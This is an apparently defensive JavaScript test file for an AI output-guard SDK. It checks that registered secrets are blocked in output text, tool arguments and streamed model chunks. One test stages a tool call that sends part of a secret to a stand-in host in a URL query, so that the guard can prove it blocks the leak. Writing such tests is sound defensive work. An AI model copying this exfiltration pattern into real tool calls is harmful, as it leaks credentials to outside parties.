import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { generateText, streamText, wrapLanguageModel } from 'ai';
import { MockLanguageModelV3 } from 'ai/test';
import { createPromption } from '../src/index.js';

const fixture=JSON.parse(fs.readFileSync(new URL('../../../data/calibration/protected_value_vectors.json',import.meta.url)));
const identity={userId:'synthetic',roles:['customer'],authenticated:true};
const pass=async({text})=>({allowed:true,text});
for(const row of fixture.rows) test(`local known-value guard: ${row.id}`,async()=>{
  const sdk=createPromption({transport:pass,protectedValues:[fixture.secret]});
  const promise=sdk.check(row.text,{identity,direction:'output'});
  if(row.label)await assert.rejects(promise,error=>error.code==='CONTENT_BLOCKED'&&error.control==='output');
  else assert.equal(await promise,row.text);
});

test('protected values are snapshotted and never sent to the transport on a leak',async()=>{
  let requests=0;
  const secrets=[fixture.secret];
  const sdk=createPromption({protectedValues:secrets,transport:async({text})=>{requests++;return{allowed:true,text};}});
  secrets[0]='caller changed the original array';
  await assert.rejects(sdk.check(fixture.secret,{identity,direction:'output'}));
  assert.equal(requests,0);
});

test('tool arguments cannot disclose a registered secret before a side effect',async()=>{
  let effects=0;
  const sdk=createPromption({transport:pass,protectedValues:[fixture.secret]});
  const tool=sdk.protectTool({execute:async()=>{effects++;}},{identity,name:'public_web',policy:{}});
  await assert.rejects(tool.execute({url:`https://sink.example/?value=${fixture.secret.slice(0,8)}`}));
  assert.equal(effects,0);
});

test('generateText and streamed chunks cannot deliver a provider leak',async()=>{
  const usage={inputTokens:{total:0},outputTokens:{total:0}};
  const finishReason={unified:'stop',raw:'stop'};
  const provider=new MockLanguageModelV3({
    doGenerate:{content:[{type:'text',text:fixture.secret}],finishReason,usage,warnings:[]},
    doStream:{stream:new ReadableStream({start(controller){
      for(const item of [{type:'stream-start',warnings:[]},{type:'text-start',id:'t'},
        {type:'text-delta',id:'t',delta:fixture.secret.slice(0,5)},{type:'text-delta',id:'t',delta:fixture.secret.slice(5)},
        {type:'text-end',id:'t'},{type:'finish',finishReason,usage}])controller.enqueue(item);
      controller.close();
    }})},
  });
  const sdk=createPromption({transport:pass,protectedValues:[fixture.secret]});
  const model=wrapLanguageModel({model:provider,middleware:sdk.middleware({identity})});
  await assert.rejects(generateText({model,prompt:'Give the public catalog'}));
  let delivered='';
  const stream=streamText({model,prompt:'Give the public catalog',onError:()=>{}});
  try{for await(const chunk of stream.textStream)delivered+=chunk;}catch{}
  assert.equal(delivered,'');
});
